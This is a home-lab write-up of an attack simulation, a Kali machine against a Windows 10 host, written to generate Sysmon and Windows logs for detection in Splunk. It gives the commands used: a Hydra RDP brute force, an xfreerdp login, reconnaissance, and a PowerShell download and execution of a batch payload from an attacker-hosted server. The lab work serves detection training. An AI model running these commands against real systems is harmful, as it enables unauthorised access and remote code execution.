# Attack Chain Simulation

## Overview

This attack simulation was conducted in a controlled lab environment to emulate a common intrusion scenario and generate telemetry for detection and investigation in Splunk.

The attack was performed from a Kali Linux attacker machine against a Windows 10 victim machine monitored with Sysmon and Windows Security logging.

Before starting the simulation, the Windows 10 victim machine was configured for RDP access. A local user account was created, Remote Desktop was enabled, TCP port 3389 was allowed through Windows Firewall, and the account was added to the Remote Desktop Users group.

#

# Attack Flow
## 1. RDP Brute Force

The attack simulation began with a brute-force attack against the Windows 10 host's Remote Desktop Protocol (RDP) service using Hydra. A password wordlist containing both invalid and valid credentials was used against a known local user account. Multiple failed authentication attempts were generated before Hydra successfully discovered the correct password, resulting in a successful RDP authentication.
### Command Used

```bash
hydra -l LocalUser -P passwdlist.txt rdp://<Windows10-IP> -t 4 -V -f
```
![img](https://github.com/sardar-o1/soc-investigation-lab-splunk/blob/90a98bb5875aaf7ff82af1826cdf428e40a6efd9/Screenshots/attack-simulation1.png)

### Telemetry Generated

- Windows Event ID 4625 – Failed Logon
- Windows Event ID 4624 – Successful Logon

## 2. Successful RDP Login

After identifying valid credentials through the brute-force attack, the attacker successfully authenticated to the target Windows system using the Remote Desktop Protocol (RDP). The connection was initiated from the Kali Linux attack machine using the xfreerdp client.

### Command Used:
```bash
xfreerdp /u:LocalUser /p:CorrectPassword /v:<WINDOWS-IP>
```

## 3. Initial Host Reconnaissance

After successfully gaining remote access to the target system through RDP, the attacker opened a PowerShell session and performed basic host reconnaissance to gather information about the compromised machine and its environment.

### Commands Executed:
```bash
whoami /all
ipconfig /all
tasklist
systeminfo
```
### Telemetry Generated

- Sysmon Event ID 1 – Process Creation

## 4. Malicious Payload Download 

After completing initial reconnaissance, the attacker prepared the payload delivery infrastructure on the Kali Linux machine. The attacker hosted the malicious batch file (payload.bat) on a web server listening on TCP port 80, allowing the victim machine to retrieve the file over HTTP.

#### Attacker Action (Kali Linux):
```bash
python3 -m http.server 80
```
![img](https://github.com/sardar-o1/soc-investigation-lab-splunk/blob/90a98bb5875aaf7ff82af1826cdf428e40a6efd9/Screenshots/attack-simulation2.png)

This command started a simple HTTP server on the attacker's machine, making payload.bat accessible via a web browser or PowerShell download request.

#### Victim Action (Windows Host):

The attacker then launched PowerShell on the compromised Windows system and downloaded the payload from the Kali server.
```bash
"Invoke-WebRequest -Uri http://<KALI-IP>/payload.bat -OutFile C:\Users\LocalUser\payload.bat"
```
![img](https://github.com/sardar-o1/soc-investigation-lab-splunk/blob/90a98bb5875aaf7ff82af1826cdf428e40a6efd9/Screenshots/attack-simulation3.png)

### Telemetry Generated

- Sysmon Event ID 1 – Process Creation
- Sysmon Event ID 3 – Network Connection
- Sysmon Event ID 11 – File Creation

## 5. Payload Execution

After successfully downloading the malicious batch file on the victim machine, the attacker executed the payload using PowerShell. The execution of the batch file initiated additional processes and enabled further post-exploitation activity on the compromised host.

### Command Executed:
```bash
Start-Process -FilePath C:\Users\LocalUser\payload.bat
```
### Telemetry Generated

- Sysmon Event ID 1 – Process Creation
  
#

